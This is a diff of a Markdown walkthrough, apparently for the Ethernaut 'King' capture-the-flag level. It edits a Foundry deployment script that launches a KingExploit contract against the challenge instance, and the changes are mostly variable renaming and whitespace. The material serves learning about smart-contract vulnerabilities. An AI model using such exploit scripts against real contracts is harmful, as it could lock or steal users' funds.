@@ -206,21 +206,19 @@ contract KingTest is Test {
 <br>
 
 ```solidity
-
 contract Exploit is Script {
 
         King public king;
         KingExploit public exploit;    
         address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));  
-        uint256 hacker = vm.envUint("PRIVATE_KEY");   
-        address deployer = vm.rememberKey(hacker);     
+        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));     
           
         function run() external {
-            vm.startBroadcast(deployer);
+            vm.startBroadcast(hacker);
             king = King(instance);
             exploit = new KingExploit{value: king.prize() + 0.1 ether}(address(king));
             vm.stopBroadcast();
-    }   
+    }
 }
 ```
 
